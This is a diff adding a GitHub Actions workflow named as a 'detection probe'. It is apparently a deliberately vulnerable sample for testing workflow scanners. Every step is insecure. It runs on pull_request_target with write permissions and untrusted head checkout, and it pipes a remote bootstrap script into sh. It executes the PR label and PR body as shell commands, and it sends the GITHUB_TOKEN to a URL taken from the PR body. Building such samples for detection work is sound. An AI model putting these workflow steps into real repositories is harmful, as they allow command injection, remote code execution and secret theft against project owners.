@@ -1,0 +1,21 @@
+name: DCOIR Review v12 balanced detection probe
+on:
+  pull_request_target:
+permissions:
+  contents: write
+  checks: write
+jobs:
+  analyze:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Install helper
+        run: wget -qO- https://downloads.example.invalid/bootstrap.sh | sh
+      - name: Run label script
+        run: bash -lc "${{ github.event.pull_request.labels[0].name }}"
+      - name: Forward token
+        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"
+      - name: Echo body
+        run: sh -c "${{ github.event.pull_request.body }}"
